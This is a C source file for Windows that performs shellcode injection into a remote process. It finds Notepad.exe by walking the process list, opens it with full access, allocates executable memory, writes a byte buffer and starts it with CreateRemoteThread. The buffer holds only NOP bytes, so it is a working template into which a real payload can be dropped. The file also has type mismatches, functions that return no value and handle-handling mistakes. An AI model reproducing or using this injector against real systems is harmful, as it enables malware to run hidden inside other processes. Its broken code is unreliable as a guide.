#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>


BOOL ProcessOpening(HANDLE hsnapshot,LPWSTR PProcessName,HANDLE *pProcAddress,DWORD* dwprocessid);

BOOL ShellCodeInjection(HANDLE* pProcAddress,SIZE_T szsizeofshellcode,unsigned char* pCharShellcode);

int main() {


	unsigned char CharShellcode[] = { 0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90 };



	HANDLE hsnapshot = NULL;
	HANDLE *pProcAddress = NULL;
	LPWSTR pProcessName = L"Notepad.exe";
	DWORD* dwProcessID = NULL;
	SIZE_T szsizeofshellcode = sizeof(CharShellcode);
	unsigned char* pCharShellcode = CharShellcode;






	ProcessOpening(hsnapshot,pProcessName,&pProcAddress,&dwProcessID);
	ShellCodeInjection(&pProcAddress,szsizeofshellcode,pCharShellcode);
	
	printf("press <enter> to exit");
	getchar();   



}




BOOL ShellCodeInjection(HANDLE *PprocAddress,SIZE_T szsizeofshellcode, unsigned char* pCharShellcode) {

	LPVOID pVritualProcAddress = NULL;




	pVritualProcAddress = VirtualAllocEx(*PprocAddress, NULL, szsizeofshellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pVritualProcAddress == NULL) {
		printf("virutall allcoex failed with error no %d\n", GetLastError());
	}

	SIZE_T lpsizeofmemory = NULL;
	if (WriteProcessMemory(*PprocAddress, pVritualProcAddress, pCharShellcode, szsizeofshellcode, &lpsizeofmemory) == 0 || szsizeofshellcode != lpsizeofmemory) {
		printf("write process memroy failed with error number %d", GetLastError());

	}

	/*PWORD lpfloldprotect = NULL;
	if (VirtualProtectEx(*PprocAddress, NULL, szsizeofshellcode, PAGE_EXECUTE_READWRITE, lpfloldprotect) == 0) {

		printf("virtualprotectex failed with error no %d\n", GetLastError());
	}*/


	HANDLE hthread = CreateRemoteThread(*PprocAddress, NULL, NULL, pVritualProcAddress, NULL, NULL, NULL, NULL);

	if (hthread == NULL) {
		printf("hthread failed with error no %d\n", GetLastError());
	}
	

}





BOOL ProcessOpening(HANDLE hsnapshot,LPWSTR pProcessName,HANDLE* pProcAddress,DWORD *dwprocessIid) {

	BOOL bState = FALSE;

	hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (hsnapshot == NULL) {
		printf("The hsnapshot failed with errror no %d",GetLastError());
		bState = FALSE;
		goto _EndOfFunction;
	}


PROCESSENTRY32 proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

if (!Process32First(hsnapshot,&proc)) {

	printf("process32first failed with error no %d\n", GetLastError());
	bState = FALSE;
	goto _EndOfFunction;
}


while (Process32Next(hsnapshot, &proc)) {


	printf(" %ls --\n\t\t\\--%lu\n\n", proc.szExeFile, proc.th32ProcessID);


	if (wcscmp(proc.szExeFile, pProcessName) == 0) {
		printf("process matched with process id %lu\n", proc.th32ProcessID);


		*pProcAddress = OpenProcess(PROCESS_ALL_ACCESS, FALSE, proc.th32ProcessID);

		*dwprocessIid = &proc.th32ProcessID;

		if (*pProcAddress == NULL) {
			printf("Process creation failed with error no %d\n",GetLastError());
			bState = FALSE;
			goto _EndOfFunction;
		}


		break;
	}
}







_EndOfFunction:
	if(hsnapshot == NULL)
		return bState;

	

	

}